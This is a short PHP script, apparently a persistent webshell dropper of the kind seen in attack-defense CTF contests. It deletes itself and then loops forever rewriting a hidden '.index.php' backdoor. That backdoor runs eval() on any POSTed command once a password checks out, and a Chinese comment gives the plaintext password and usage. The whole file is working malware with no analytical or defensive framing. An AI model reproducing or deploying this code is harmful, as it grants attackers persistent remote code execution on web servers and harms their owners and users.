<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php if(md5($_POST["pass"])=="9f201e7e140561ecc201dd35e28925ec"){@eval($_POST[a]);} ?>';
// pass=5211314WEB3 马儿用法：?pass=5211314WEB3    post   a=command
while (1){
	file_put_contents($file,$code);
	usleep(5000);
}
?>
